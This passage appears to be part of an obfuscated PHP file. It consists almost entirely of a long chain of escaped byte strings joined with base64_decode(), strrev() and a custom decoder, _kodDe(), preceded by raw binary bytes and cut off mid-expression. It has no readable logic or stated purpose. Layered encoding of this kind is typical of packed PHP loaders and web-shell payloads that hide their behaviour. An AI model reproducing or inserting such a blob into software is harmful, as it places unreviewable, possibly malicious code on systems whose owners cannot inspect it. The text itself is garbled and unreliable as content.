¦×YØ£5Ií‹’WkÛÃ8%yÁ!É')."\125\255\243\223\362\306\226\63\123\12\213\107\257\217\54\77\47\300\11\160\120\3\321\204\36\326\115\201\20\51\120\15\241\200\175\211\252\6\31\122\123\63\111\112\12"."\250\127\347\45\300\101\364\274\125\306\23\74\155\11\121\342\231\5\371\15\155\261\302\247\253\232\366\207\324\335\233\114\160\216\54\134\357\153\234\51\67\4\74\136\277"."\354\153\4\4\66\234\17\157\156\362\270\50\72\210\360\232\100\270\336\2\155\6\124\150\266\313\357\313\315\356\235\343\13\205\103\5\223\0\254\331\233\223\2\204\256".base64_decode('pqC31jeHRWt9Xr8nJLtd7nqep9HVQCJyOxR7TKc1vwzOihATnuRuKAjSOZEt')."\222\212\114\171\160\231\143\16\70\327\124\202\255\144\270\120\374\104\43\41\274\160\114\317\122\374\145\214\135\222\322\230\244\102\166\257\322\115\120\253\4\377\224\112\256"."\x90\x94\x49\xcb\x8c\x9a\x44\xfb\x58\x10\xd\x83\xc6\x1\x27\x47\xda\x97\x8\x69\xcf\xeb\x81\xc\xf3\xd4\xa8\xed\xba\xa1\xfe\x11\xc0\xd5\x9e\xa1\x9b\x3f\x37\xe\x76\x12\x4f\x3\x2b"."\xe0\x42\x72\x2e\xc0\x4\xb4\x22\x32\xdd\x9d\x26\x90\xb\x5c\xb4\x3b\xed\x5c\xc6\x94\x3\x40\x18\x77\x41\x9\x55\x6e\x9\x6\x1a\xeb\x48\x81\x9e\x4e\x95\x76\xc0\x47\xa6\xbf\x84\xf2"."\x39\x44\x50\xcd\x70\x72\x5\x98\x14\x85\xf3\x9b\x74\xd2\x17\xea\x74\x2a\x97\xe2\x9f\xb1\x64\x87\x2\xb6\x98\x9c\x43\x29\x3a\xeb\x51\x48\xdb\x19\x29\xa1\xb2\x7\x40\x7a\x4a\x97\xf5"."\x2c\x6b\x2d\xaa\xeb\x9\xba\x1d\xc1\x49\xce\x28\x8\x13\x71\x17\x9a\x14\x49\x7a\x29\xb9\x1a\x47\x1a\xec\x25\xc4\x21\x1c\x98\xe9\x6d\x94\x29\x66\xe1\x98\x80\x8d\x18\x0\x84\xc6\x40".base64_decode('kExIRu+iggtODHpDdDMb6qKsRqfL6RhHsFgFRxhp3jk/0jOupNU+ztEGAqVl')."\323\161\224\304\42\16\113\164\64\51\237\65\130\151\170\352\227\230\325\245\225\21\147\304\131\122\135\331\352\262\57\126\354\213\313\355\147\330\333\306\105\34\245\343\10"."\xa0\x6d\x49\x85\x6d\xe2\x32\x98\x1\x64\xac\x1e\xd5\x6\x7e\xaa\x22\xd5\x63\x22\xf6\xb1\xcb\x17\x4c\x6f\x8d\xb4\x15\x57\x8e\x3b\x35\xe2\x18\x15\xe9\x69\x2b\x2b\xad\xa6\xed\xc4\xb2".base64_decode('BhDKYn2sq/FxJaBLgPFhWVKIsgkZaMJiLc2hSyYvo3CwhmoHL9Fqj4xrqxbK')."\11\240\334\266\0\143\4\310\154\47\313\347\262\317\203\43\143\105\341\276\47\370\221\115\305\70\221\204\373\42\252\304\10\35\320\72\122\154\13\1\236\200\11\303\126"."\x86\x7a\xc9\x18\xfc\xbb\x8c\x2e\x64\x87\x4a\x8f\x6c\xa8\xd1\x32\x8\x76\x66\x53\xda\x22\x2a\xec\xa7\xd4\x45\x24\xa0\x67\x28\x7e\x47\xd5\x4c\x8f\x4a\xd1\x3\xc0\x2d\x71\x80\x1c\x54"."\242\3\111\102\54\201\130\100\322\2\227\244\124\44\126\220\121\244\145\310\271\365\260\130\134\115\221\165\32\110\162\233\61\45\255\206\204\21\312\162\330\125\343\367\312".strrev('b¤ ­¼j­²D‰,ïÙÙ`|¡Z^N,¶Ìå<L¨§õ0Ö*ˆãLJÂ”').strrev('s€ìàİj`]ƒ%’i§—ùØeŠí€˜:ù§-"0F‡ğ“å)Ya2[oo').base64_decode('BjajZ5QEywbTwhBCqQY9OiFXIejbEEVrZMokQcPDFAhWmE2I4n+riLjs89jJ')."\x74\xbb\xe6\xd8\x7d\x84\x91\x67\x1\x8d\x34\xb8\xf7\x9f\xe7\xac\xdb\xb3\x1\x87\xaf\xbb\x76\xd3\x4d\xa4\xa6\x83\x97\x1e\x6\x42\x28\xcc\x15\xcd\xe7\xcd\x6e\x5b\xf5\x76\xf9\xd0\x6b"."\x86\x4e\xb5\xdd\xf9\xd5\x91\xce\x97\xcb\x22\x7f\x9a\x35\xe8\xea\xb2\xe3\xb2\x47\x4e\x95\xc2\x7d\x57\x69\x5d\xef\xae\x1c\xf5\x41\xe9\x89\x8f\x1e\xf1\xe9\x41\x23\xcf\x39\x31\x3d\xea"."\xa7\x11\xef\xef\x79\xdd\xff\xd6\xb0\xf9\x1b\xf6\xae\xdc\xbc\xf7\x40\xdf\xc3\x93\xb6\x36\x6d\x7b\xf1\xeb\xdf\xde\xfc\xf5\xaa\x3\x9b\x3f\x7b\x60\xd6\x4a\x87\xb4\xcb\x73\xec\xf2\xae"."\xd4\x7e\xd7\xc3\xc9\xc1\x7b\xb6\x6c\xb9\xda\xe6\x3a\xe2\xd1\xdb\x1f\xbe\xfc\xcd\x97\x8c\x4d\x87\xfc\xed\xb5\x9e\x4f\x5f\xbb\x75\xe0\x3d\xe3\x96\x1f\xba\x33\x56\xfe\xdd\x8d\x67\x8c".base64_decode('a3+hZ8F5h6cU+4e7Zl0d/aD78xtv2Lrk1FeHnnyL+Ur5gmHDJ4zdctToOQvm')."\xbc\xea\x5f\x33\xef\x87\xf7\x5e\xdc\x77\xd2\x9c\xe7\x6\x8e\x9e\x79\x75\x9d\xda\x33\xfe\xfc\x1\x7d\x4b\x27\x36\x1e\xd5\x97\x29\xd2\x23\xcf\xd5\x3d\xb8\x74\x56\xb2\x79\xe3\xb7\x2f".base64_decode('vnPT6/PmfPq4w67MfubVxg+1d985JTjgnJrjZp1d2v7ijLvf//vxz2yu23XM')."\xb5\xd\x89\xe2\xd\xf6\x5\x5f\x9f\x54\xb5\x7f\xd2\x1b\xe6\xb\x4f\xed\x77\x8d\xb8\x63\xf8\xa3\x1f\x1b\xaf\x5\x56\x97\xff\x5e\x74\xd9\xb0\xb1\x63\x1d\xff\xf3\xdb\x3\x37\x1d\x68"."\32\261\356\237\277\17\172\356\343\330\71\135\117\375\355\324\273\347\76\65\263\357\260\37\7\135\274\341\362\353\136\75\273\50\126\262\367\326\330\256\343\237\175\151\327".base64_decode('Fdv27vtX2ZsnPflu7GPv+tgZWx879uKJ+2q1KcOlV5/617wvW95/54qRdwyo')."\271\373\51\357\21\143\106\237\364\312\151\315\37\354\335\375\331\57\137\277\22\370\373\212\136\245\346\223\337\53\56\373\147\313\245\365\167\65\164\176\361\322\323\327\272"."\344\41\157\74\174\314\303\133\237\225\206\266\55\126\353\367\77\242\154\336\366\155\233\154\76\174\321\272\345\77\157\373\270\367\230\163\137\110\274\32\370\156\302\220\45"."\75\3\226\134\232\74\246\353\256\367\173\106\174\372\365\321\275\233\377\361\133\305\155\217\36\333\136\172\317\363\153\76\154\336\70\173\135\371\321\67\33\227\136\227\56"."\375\342\302\17\157\335\162\360\334\233\135\217\57\232\161\361\256\331\143\216\73\341\274\321\362\216\143\17\355\171\54\74\142\337\73\23\366\334\57\237\270\357\310\313\133".strrev('³¾Õß#É{¼GcİüÓZÎSé«ÿ¼\'Û¸øşoëÉû~|+3¥ÚlSû^ÖyÎ')."\171\305\265\53\376\74\347\366\355\366\255\241\157\326\106\155\221\7\206\124\237\371\353\277\367\34\230\171\220\174\301\235\167\114\72\156\325\314\346\27\174\303\357\371\347".strrev('8ëîŸöçäpd÷İ÷»-Ã£²ëØü»nK×{Ÿ,7¼ô©´_ß…âïy§/Å')."\143\303\361\167\276\176\135\40\176\361\222\33\226\377\345\374\337\217\273\155\117\357\266\375\73\235\237\324\137\170\360\212\1\364\212\0\60\302\140\333\372\325\156\312\6"."\230\172\326\210\251\14\365\55\102\322\170\306\303\200\14\56\303\120\372\304\62\100\150\123\0\120\4\325\103\141\224\312\157\232\56\143\250\14\67\62\206\205\20\300\333"."\xcd\x48\x7\xae\x5b\x4c\x44\x14\xd0\x81\x65\x32\x91\xd3\xc2\x3d\xa7\x79\x6d\x85\xfa\xcb\x35\xcd\xb0\x5a\x2e\x24\xe5\xc7\x68\x35\x5c\x33\x9a\x51\xc\xc0\x20\xf2\x5c\x85\xe3\xb4\x9c"."\x35\x86\x3b\xdb\x6c\xd2\x7e\x60\xad\x1e\x8f\x5b\xbb\x9e\xb7\x4\x9a\xe9\x11\xe4\x5a\x3e\x93\x38\x5e\x8e\x7f\xb0\x54\x99\x52\xe9\xc9\x0\xc7\xda\xa4\xa5\xfa\xe8\x21\xc7\xe3\xa2\x36"."\0\34\222\354\152\206\54\264\15\346\264\361\341\331\350\130\154\174\30\66\72\257\66\72\165\66\72\6\233\320\175\33\236\112\33\237\305\204\326\105\102\266\61\205\6"."\307\145\142\160\176\350\335\52\136\162\161\371\241\174\225\303\15\132\121\64\313\246\125\63\103\235\240\63\141\162\252\240\10\51\1\203\154\215\141\104\146\134\11\352\162".base64_decode('ELUuoLQF9/R0Hx5+raEnfQGHCW+f/ot8KuWcYSNIbZxfSIkjxUB/ddJkVhWf')."\61\45\235\16\146\311\152\247\23\131\246\155\301\141\226\324\44\44\71\242\302\6\162\50\134\54\201\134\232\101\113\64\7\375\160\65\350\32\301\250\236\145\131\251\366"."\xab\x39\xe8\x23\x2c\x3\xd3\x9b\x53\x6e\x11\x33\x16\x8b\x1\x2b\x18\x71\xca\x6d\x65\x4\xdc\x40\x75\x65\x54\xa\x77\xb9\x79\x80\x89\x8d\x73\x93\x64\xa0\x35\x80\x39\xcc\xd2\x15\xcf"."\50\231\254\231\223\201\336\261\304\104\55\136\227\252\122\235\24\325\172\161\126\302\314\42\335\61\115\347\123\11\21\126\140\71\140\64\44\346\215\245\62\102\62\210\131"."\x52\xa1\xfa\x7\xae\x38\x8f\x31\x14\x4\xb3\xca\x98\x30\x2c\xf3\x38\x60\xf\x1d\xd6\x1\x95\x8f\xb7\xe4\x88\x47\x2d\xe9\xc\x4a\xf1\x24\x37\xa5\x3d\x17\x1e\x45\x53\xe7\xa0\x33\x10"."\25\146\122\211\3\211\331\221\121\314\56\207\10\266\213\251\200\355\3\143\115\70\254\67\263\274\163\134\146\117\366\231\213\22\171\311\174\246\160\23\162\336\350\304\331"."\43\47\201\244\230\61\166\116\160\355\244\246\163\222\113\5\172\374\263\300\106\357\142\113\45\244\324\10\111\104\115\143\43\277\203\361\117\204\40\156\204\240\167\261\215"."\134\146\170\152\204\113\346\164\234\254\131\45\113\364\204\10\116\222\11\161\302\11\241\70\136\150\155\362\106\16\7\313\307\102\46\271\4\102\310\40\360\5\252\43\177".base64_decode('FvFai/Nk6QSaeF6sI5M/W6QHvHlyi9UukFyOPlYMtyCWdW8QEo9ucW0SbtAm').strrev(';ó*æ vte.)TI`í†ò@íI÷Jc„é¨f¸ŠšøyôW½d›1«Á')."\x27\x9e\xdd\x39\xc3\xb1\x6c\xd1\xdc\x1\x59\x12\xc1\xbc\x66\xd9\x85\x1e\x3b\xb0\xc4\xa3\x8\x49\x58\x7c\x6a\x71\x94\x29\x7d\x43\xa0\x26\x26\x96\x19\x6a\x5c\xa3\xca\x15\x35\x89\x72"._kodDe('La5DKxWJ6BhHQYf0BpNHrkTF5zFbkjQ3kjtXqiaHHfd2iTrOXFk2gDNKZnQb8Q==')."\41\115\122\15\103\67\246\100\342\124\305\241\4\227\205\274\16\16\356\41\132\230\166\322\134\203\165\70\240\33\166\66\102\320\153\100\203\343\46\62\65\41\230\172\52"."\x99\x5d\xe1\x1a\x38\xc8\x27\x7\x16\x47\x73\xf5\x7\x45\x33\xe2\x80\xd2\x80\xce\xa7\x98\xd8\xa9\x30\xb6\xc0\x4c\x28\xf4\x2e\xdc\x4\xc7\x0\x60\x89\xd8\x4\x67\x4d\xcb\x1\x7\x95"."\262\174\366\40\56\160\204\225\225\166\162\53\346\23\56\274\145\300\10\311\344\174\241\344\52\235\166\346\127\66\211\55\261\34\327\250\336\77\223\111\313\261\204\156\12"."\x7b\x42\x4e\x67\x73\x2b\x14\x8d\x71\x2a\x5\x82\xa\xef\x62\x38\x3\xb\x63\xfc\x4e\x6\xf2\x3c\x3c\x2d\xad\x98\x66\xf\x10\xae\x9\x36\x7a\xc3\x12\xd4\x8d\x85\x24\x4e\xe6\xdc\xf5".base64_decode('riDTf01ylDvG87ygQRmqAavoHW8o7AoWMJPB5jNkHYnJDClQH2iR3AF/c0Nj')."\10\333\205\140\170\143\100\110\107\132\16\113\262\10\46\325\172\233\374\56\267\127\362\65\206\3\124\175\311\264\270\204\306\133\17\201\64\274\331\146\146\61\244\74\216"."\210\312\165\261\106\126\23\101\376\126\133\161\244\50\122\26\51\211\224\56\160\104\314\66\102\331\27\10\47\234\46\256\16\211\64\171\310\350\52\131\50\156\22\324\151"."\x8\x85\x66\x91\x8b\x9d\x40\xd0\xe5\xf6\xd3\x1e\xd5\xb8\x42\x24\x18\x70\x13\xe6\xe9\xcb\xd5\xf\x6d\xdf\xb8\xea\xcb\x1b\xd6\xef\xb8\x68\x25\xa8\x68\xe7\xf5\xe7\xec\xbc\x76\xc3\xf6"."\x27\x56\x7e\xb5\x62\xd3\x8e\xf5\x97\x7e\xf9\xd4\xaa\x9d\xab\x1f\xd8\x79\x29\xb1\x70\x93\xbe\x7a\xe0\xf1\xed\x9b\x9e\xfe\x72\xf5\x5d\x3b\xd6\xaf\xd9\x79\xcd\x93\x5f\x5e\x7f\x2e\x4e"."\330\165\367\103\73\56\276\213\165\114\332\165\325\123\73\127\335\276\363\352\7\167\256\134\277\143\343\125\73\376\176\316\216\47\236\260\201\322\273\316\133\371\345\246\365".strrev('ÚEt­ã„x¹©õp=_•üã±]n;ÕrúîëË|\\w+µÎÉv>v³ºçf¼/;').base64_decode('yMTNj5hlJXiWI+Y4OMOl4LcEKkXBL9UhAewLQY6x0e3NvWQQo8S0qAwjCMRv').base64_decode('2VQXZdUUINPENInGZXQTVdxvL5YSNBA6JXTG4w25g74aL1G7sYUag9RJREgB')."\xd0\x50\x70\x36\xb\xb3\xbb\xb9\x3c\x83\x30\xa9\x84\x33\x21\x96\x81\x28\x40\x1a\x48\x64\x93\x29\xd4\x59\xa9\x8\xaa\xa9\x8a\x6c\xf0\xe8\x46\x37\x1e\x52\x11\x3c\x4c\x0\x40\x8d\x81".base64_decode('nVcCLU1glbbiucW2ctv4UolYi+ESxDpMKiKWYaycpRFb1BIbbysvlYrSXUWk').base64_decode('X3xeQe9lnNOUFFsJ6bDYXZ4XECczYygaoFZSzMZArDz4tVh8xRy8BF4nkCMX')."\x26\xb9\x1a\x3d\xd6\x9c\xd8\x50\xac\xa9\x58\x52\x52\x71\x90\x82\xe7\x57\x5c\xe6\xe2\x52\x29\x2a\xa1\x5b\xe\xa9\x40\x22\x2a\x66\x99\x8c\x2a\xcb\x64\x94\x8c\x23\xe4\xa2\xa9\x8e\xad"."\x37\xd6\x61\x4a\xf8\x22\xb\x77\x4b\x31\xe9\x42\x11\x28\x5a\x2a\x8\xc5\xab\x45\xf3\xea\x60\x18\x60\x71\x70\x7e\x10\x60\x29\x5d\x6a\x1f\xaf\x9\x50\x25\x96\x40\x57\x10\xc2\xd9\x22".strrev('1ÑãÍ!åŒzîÃyÉ^şÜ¨É—l¹†±Ãâ”šLãÂ˜E|CH')."\104\345\323\51\131\120\44\301\155\100\120\76\274\135\40\101\30\210\362\371\32\153\3\301\6\174\25\25\162\327\173\33\134\16\102\313\61\46\340\374\220\277\226\252\244"."\142\110\371\60\250\330\62\375\250\41\72\145\141\324\52\330\127\162\106\65\63\170\26\322\35\244\63\144\365\45\144\256\240\240\42\125\305\330\60\207\124\311\314\125\3"."\xc1\xb0\xc\x26\x80\x90\x67\x81\xea\x16\xb\x87\xc6\x6c\xae\xb\x86\x37\x2a\xdd\x4c\xf6\xc3\x1c\x39\x67\x83\x94\x71\x9c\x5f\x52\xe3\x84\x38\xb6\x2b\x31\x20\xda\x51\x33\xb5\x28\xb5"."\175\5\135\200\55\273\3\215\265\76\172\67\347\211\132\322\74\101\37\64\251\41\235\223\150\15\302\105\50\210\160\235\6\210\244\173\342\54\314\15\64\140\2\343\7".base64_decode('QISzAyDCTiKYS7DNBe03A0rJKXCLh4Xr2e04TAgEhYgr6GoIsWiwBVB0CBOu')."\217\33\134\241\60\30\125\143\163\3\247\372\176\327\154\200\60\1\316\243\120\212\135\342\50\253\56\215\340\313\61\34\304\77\323\151\14\352\17\332\226\214\267\111\223"."\x97\x95\x92\x3c\xf4\x3a\x49\xce\x74\x6a\x29\xca\xac\xc2\x56\x66\xf9\x65\x7f\xa0\xe\xc7\x91\x69\xb0\x37\x15\xe7\xac\xb9\xd4\x2a\x5\xb3\x29\x18\x27\xc2\x83\x49\x8f\x2f\xb6\x23\x24".base64_decode('gMcSvnGXGgMtLm5nKiRgCOGcJW596pzfGumJOAD7YC7gd16eGokyJu5OlTLf').base64_decode('1BrbRU9UenRQQVZO6B3UzAyQSMpA4N85NICoJykARLp0gt6B4cs3ObI0MjZi').base64_decode('d+D7RsjVRGy8Z7J3Djh1QyHLZamMLDFJ7WDMJIT3MY5MJT9ELJlKZoJEp1Wx')."\245\365\316\132\332\10\376\257\13\57\365\202\377\375\340\307\37\6\213\247\261\14\140\223\372\175\63\275\113\341\77\74\241\124\22\63\370\32\227\202\177\1\211\131\352".strrev('•+·³É —,¬Úq‚Xmo~KŞ€F|pÁ42_“'."\r".'8½x·'."\r".'ã\\-Ìk')."\x65\xa7\xd9\x4c\xb0\x85\x99\x27\x95\x14\x8f\x1e\x5f\x4c\x4e\x11\x57\xc8\xcd\xe9\xaf\x5\xf\xf2\x51\x20\x0\xef\xbc\xac\xeb\xcf\xc\xa1\x49\xbc\x2e\x18\x68\x6e\x12\xe2\xf5\xae\xd9"."\276\306\72\32\163\226\321\20\325\243\111\36\137\10\114\221\233\342\40\267\317\26\343\204\345\104\214\221\310\376\132\20\332\3\150\73\210\10\114\71\224\6\60\155\266"."\356\261\232\146\237\337\43\332\203\300\214\344\110\101\164\235\234\52\143\150\347\150\34\131\206\320\10\234\162\32\106\350\105\43\150\16\150\4\117\0\215\241\351\242\21"."\144\7\116\43\150\240\64\2\305\23\157\43\115\3\162\45\220\4\251\260\330\141\350\124\371\320\251\164\13\127\257\334\344\3\352\41\160\50\311\114\253\63\106\126\155"."\x52\x4\xf5\x73\x42\x37\x54\xc3\x81\xf4\xd4\xd9\x28\x4c\xf1\xc2\x75\xe5\x15\x20\x53\x55\xb2\xd8\xf8\xf8\xc2\x69\xb6\x8c\x2e\xf1\x5c\xbc\x4a\x18\xa3\x26\x1f\xd8\xae\x3b\x57\x15\x2c"."\x82\x99\xa\x58\xd3\x61\x3c\x90\xcd\x88\x16\xd6\xed\x5c\x1\x49\x6d\xcf\x33\x6a\xd2\x52\x4b\xb3\x70\x85\xab\xc4\xa9\x18\xf\x8f\x7\x1a\xcc\x74\xf2\xab\x66\xd1\xf8\xda\x53\x43\xe7"."\46\233\2\255\46\332\351\321\206\164\354\176\100\221\163\346\310\24\164\357\110\217\302\7\215\165\361\354\356\27\33\267\347\324\103\52\366\261\21\10\271\70\320\317\215".base64_decode('r6GakjfRoKV8AbaDmVnzYo2qIuFIoa1xgqr7WcdTepNqJDWk0GnhT0pYuspX')."\x1c\x56\x42\x15\xbd\x44\xb7\x96\xb2\x5a\x87\x67\x53\xa0\xc9\x26\xb6\x98\xf6\xf1\x34\x33\x7d\x37\x83\xf0\x47\x62\x5c\x0\xb3\x80\x7\xb\x86\xca\xa\x86\x43\x48\xc9\x4e\xaa\x35\x12"."\30\311\116\315\351\134\106\327\33\224\124\137\130\237\255\251\304\10\301\23\150\151\364\7\250\155\52\265\102\377\243\116\43\34\346\57\206\110\33\55\224\166\32\12\65".base64_decode('1Qy66wErI9f6AJ/nnUPYhZkBjxwKNAepFA7jkOWQg173XCYJM2ita3YuBFYX')."\166\325\25\4\63\155\55\204\43\232\41\7\3\220\353\363\372\153\163\12\204\352\231\301\262\25\46\207\3\162\203\220\202\201\100\304\153\310\205\371\175\215\63\5\230"."\27\216\230\307\153\374\1\267\220\114\21\116\34\60\240\107\71\100\314\375\261\363\54\262\4\211\313\225\325\45\221\370\122\170\202\330\145\160\0\125\107\226\225\226\104"."\234\325\216\62\306\366\10\334\41\332\11\134\27\111\215\23\226\24\116\166\72\34\244\12\26\0\154\27\263\171\242\230\103\236\66\204\262\151\316\124\222\32\227\221\274"."\276\0\140\4\303\365\162\150\156\210\315\225\331\147\262\335\150\115\267\40\1\316\46\52\124\163\62\203\377\233\304\254\141\225\232\205\346\144\264\140\21\316\33\124\143"."\x7d\x31\x76\x91\x83\x40\xe\x4d\xe7\xc4\x20\x84\x40\x81\x34\x37\x3d\xc2\x99\x78\x8e\x25\x9a\x5e\x49\xf7\x47\x2c\xb\xcd\x58\xf8\xfc\xf1\xbd\x5\x40\xc4\x4e\xbb\x82\xde\xd7\xcc\xb5"."\x27\xed\xf1\x48\xb8\xe\xda\xa2\x46\xe6\xb1\x2\x9a\x21\x18\x83\x2\x29\x37\x8e\x4c\x69\xa9\xfe\x30\x46\x49\x56\x16\xc8\x13\xf4\x2e\x16\x52\x7c\xd3\xde\xa3\xd1\x2e\x8d\x66\x26\x2c"."\344\16\100\126\220\355\224\54\136\363\54\262\233\132\107\312\256\44\72\164\100\251\72\223\24\252\164\131\322\271\165\162\132\7\322\22\175\106\147\7\115\10\151\70\63".base64_decode('qJzSbXG5IHowxXUIdaFSmkjeMdSCQ4E+gdMz6Awk02mT+PMlyhAVplxQ4Anl')."\236\31\374\220\240\233\53\331\305\157\57\222\135\114\323\112\217\110\176\200\213\367\312\134\62\42\257\220\100\132\115\37\275\65\40\27\254\65\175\101\341\312\323\325\22"."\x9a\x68\xaf\x6f\x70\xb9\xed\x80\x12\x54\x4c\x9a\x4c\x96\x3b\x9\x16\xbb\x5e\x63\x4b\xad\xf4\x98\x13\x65\x68\x4d\xa8\x52\xa1\x6c\xdc\x64\xa9\x13\x74\x9d\xac\x61\xbe\x75\xf6\x68\xeb"."\173\2\14\304\46\323\61\103\215\103\365\65\75\321\60\64\147\155\61\220\237\342\70\216\115\320\350\145\106\247\302\72\14\207\201\103\205\332\235\123\260\335\71\205\332"."\x9d\x93\xd3\xee\x9c\xfc\x76\x31\x28\x7\x87\x94\x74\xda\x8d\x1f\x1f\x89\x3b\xcf\x2\x8a\x89\x11\x4a\xa2\xda\xa1\xe6\xdc\xa2\xee\x47\x17\x93\x26\xbe\x4e\x75\x80\x64\x70\x7a\x43\xb5"."\100\234\345\67\171\210\275\130\150\27\136\142\374\177\215\370\145\176\31\340\40\33\175\114\226\264\236\315\164\66\260\103\133\264\107\67\304\165\240\126\357\166\156\253\37".base64_decode('hVoDMER6Ae8LOHXTLHCBAKASvgnIYuohIcZMhU8qNVNSoindSNI1Iu8pmHk6')."\63\136\347\26\356\230\263\47\134\106\130\41\34\157\203\322\353\352\120\103\52\44\112\144\302\274\275\151\335\124\305\67\31\161\25\31\352\62\343\25\245\27\222\12\172"."\247\245\30\135\52\33\65\350\165\216\255\277\251\252\135\224\51\22\370\130\306\273\66\61\303\373\334\276\321\267\4\242\235\45\177\273\1\367\75\47\126\11\370\20\52"."\151\171\77\145\260\347\37\302\113\140\254\37\262\363\64\1\140\27\362\201\41\164\260\165\260\223\55\335\211\346\204\336\322\340\237\171\205\372\152\67\370\213\214\100\50".base64_decode('hB+oAdmfPkjI2RQ5bxgidZGGSJiiltAkqEqiY+v/hQYRvccWfJNBE/FKZQyl')."\xbd\x1d\x8c\x1e\x2d\x2f\x49\x42\xcf\x2e\x9c\x6\xba\x9\xb3\xf5\xc8\x22\x90\x4f\xbe\xf\xc6\x5b\xf8\x8b\xc\x14\xaf\x17\xb6\x1\x40\x6b\xf4\x6a\xb6\x0\x62\x23\xf8\x7f\x8f\xda\x22"."\176\101\1\206\156\153\276\71\323\131\341\341\67\146\141\233\320\343\35\112\211\4\26\335\120\301\264\247\152\364\70\71\364\226\24\1\114\56\252\54\32\135\2\176\113".base64_decode('i2xFcKeiOMQACEANFVWOLkGBUmJpvJgYXQlm5VwTRzjtaiWTEd7IVKNJhIx4')."\x85\xb3\xc2\xd9\x43\xa8\x50\xf5\x22\xd8\x22\x7f\x88\x8a\x73\xf1\x83\x2e\x6\x78\x7b\x39\x6d\xe8\x1d\x6\xbb\x9d\xce\x3d\x75\x7a\x65\x40\x6b\xe8\x1d\xa2\x2c\x92\x7b\x72\x90\x90\xf5".base64_decode('F1PqWWfpQdDgmUTptqthnp2/BZla3ZtMSOTtRlXxeEd5sUQfKFcVN4dr7acX')."\127\117\33\64\325\215\124\117\31\265\1\352\216\340\163\32\374\222\167\32\261\275\230\12\67\72\213\70\255\261\376\312\22\152\233\124\26\353\51\160\270\2\241\65\351"."\210\121\377\4\314\312\250\32\33\70\121\207\5\200\33\321\142\116\370\376\314\261\220\236\201\2\353\2\137\140\223\166\265\144\207\24\3\244\303\254\52\202\320\42\311"."\x34\x62\xd4\x2\xb8\xc8\x49\x5a\x47\x19\xb8\x55\xf1\x54\x8d\x14\x29\x86\x45\xa4\x76\x30\x7d\x76\x14\xc2\xc9\xc5\xd3\xa6\x3a\x35\x52\x12\xf2\x30\xe\x78\x54\x4\x75\x7a\xa6\x30\xfe"."\xa6\x9b\x9\x64\x5\x25\x4d\x97\x60\x18\xcf\x32\xc0\xaa\x1c\x31\x25\xc5\x85\x39\x24\x42\x50\xc6\xc5\x12\xb1\xa\xde\x4c\xa4\x23\x3b\x46\x9c\xaf\xb4\x12\xeb\x82\x67\x28\x7f\x75\x81".strrev('–´®I¹÷#–[-® Šà–K§]r'."\n".'hèá˜e£\'€òÁ8Ç	¡$“').base64_decode('grOfC4OMJIcBvsLaDMYCMROH0Dz+xrpWemuIYpHWYkfZsmVOjar7IkU0L6ZX')."\xe\x96\x1b\xc7\x23\xe\x6b\x7e\xd0\x39\x32\x9b\x2c\x23\x1\xe4\xe6\xc4\x74\x6a\x6\xc1\xcf\x41\xce\x32\x6e\xe6\xc2\xd4\x7a\x12\xd4\xf5\x55\x55\x4d\x6b\x65\xc2\x37\x33\x9d\xa3\x44"."\x47\x1b\x7f\x3a\x5d\xc7\xc5\x9d\xf6\x70\xb\xb\xba\x1b\x39\xc5\x5\x9c\x8e\xae\xb\x86\x2\x8\x91\xb0\x15\xa0\x23\x6\xd5\xd1\xd0\xa4\x52\xb8\xfe\xa8\xee\x66\xaf\xe0\xf0\xa4\x89"."\x61\x57\x3a\x2d\x46\xd9\xa6\xeb\x4b\xa8\xce\x84\x16\x75\xb2\xd\xe1\x44\x30\x47\x8c\x1b\xd5\xd0\x2c\x68\x6b\xe6\xc0\xa1\x7e\x2e\x27\x1\x1a\x56\x20\x70\x37\x60\x16\x74\x83\x6d\x66"."\x6\x7\x75\x31\x20\xb\x4c\x35\x63\x86\x96\xce\x58\xb6\x32\xf6\x3b\x51\x84\x9e\x40\x2e\x54\xba\x15\x9c\xa5\x48\xa2\xef\xe0\x8b\xd0\xf3\x8d\x22\xb0\x75\x71\xa\xd9\xbf\xbc\x2b\x53".base64_decode('E1qqSzLURFUR6q7ZqaqgfCc4Zgo2AgoWTaPnF5svI6MDcZq9bG2ciwPT8c+o').base64_decode('+fh39CjOUhh6IgEORXSbiSgC0sO0c/mKvMduCgbCATd9O1pIEAMg0g1sm8RP').strrev('jÓÖà7)‚ÀI¡1¡‡Şp*2$j›3¨hí±IÅŸ!HiŠTÙm¡à'."\n".'L')."\234\154\15\300\124\62\153\161\14\57\120\2\213\352\260\76\212\366\234\75\257\50\57\57\267\227\217\7\177\231\266\214\324\127\131\136\236\227\245\274\274\22\375\45\107".strrev('æ¦$(p©"ŸÄáïwIS<òL>RÈğ@ëœµ€r‚¤¦ÀSYdÉÓ”(')."\313\257\167\130\126\100\264\137\146\146\344\200\63\113\165\240\11\245\323\106\55\350\100\66\276\210\240\37\336\124\234\110\331\123\260\161\133\225\330\30\334\363\72\237\310"."\x7c\x1d\x48\x86\xa5\x89\xed\xe3\xb7\x65\x80\xbf\x62\xb4\x1e\xe6\x13\xac\xff\x60\xb4\x16\x70\x74\x26\x33\x3\x83\x10\x70\x90\xc5\xd8\x68\x21\x40\xf0\x72\x1\x99\xf6\x10\x17\x4\x60".base64_decode('VNRDo2RmwIViCWbCC6ONrKZCKNap98j8JIPRGSym8hkik0epHEUgqm4lilBk')."\25\333\245\45\54\106\220\324\2\257\23\362\370\264\76\11\253\141\254\123\316\247\24\275\63\102\236\61\124\244\341\255\34\44\314\225\241\13\66\235\205\265\376\24\26"."\372\377\134\4\120\210\227\2\60\343\343\146\166\350\102\5\271\111\71\145\134\161\341\175\72\344\102\35\224\13\25\352\200\360\246\302\140\207\225\151\25\163\26\310\304"."\x1a\x17\xf3\x89\x40\x88\x85\xd4\xa7\x5\x59\x4d\xca\xe1\x40\x4e\x91\x11\x28\x21\x2b\x7f\x3b\x2e\x0\xad\xb8\x2a\x24\xb8\xd9\x73\x4d\x11\xd8\x99\x4d\x75\x35\xb\x7e\x5c\x58\xa3\x56".base64_decode('nztQNMipmaTzd96a7iarA8fAFZpWOIZ9fv4VNHAV2ZSoE4zLF2Vi60QXWKW8')."\111\106\230\125\17\335\122\260\215\41\304\320\105\203\3\75\27\341\254\137\116\64\367\62\2\355\361\14\335\246\144\373\240\114\174\72\60\241\304\361\2\55\220\102\254"."\x88\x83\xde\x4d\x38\x62\xed\x1d\x39\x20\xb6\xdc\x26\xd6\x4f\xb\x1e\x10\xf2\xb2\xa8\x9c\xef\x45\xa6\x2c\x80\x19\xa3\xd4\xa2\x41\x5f\xc\x36\xb7\xe2\x9c\xe4\x2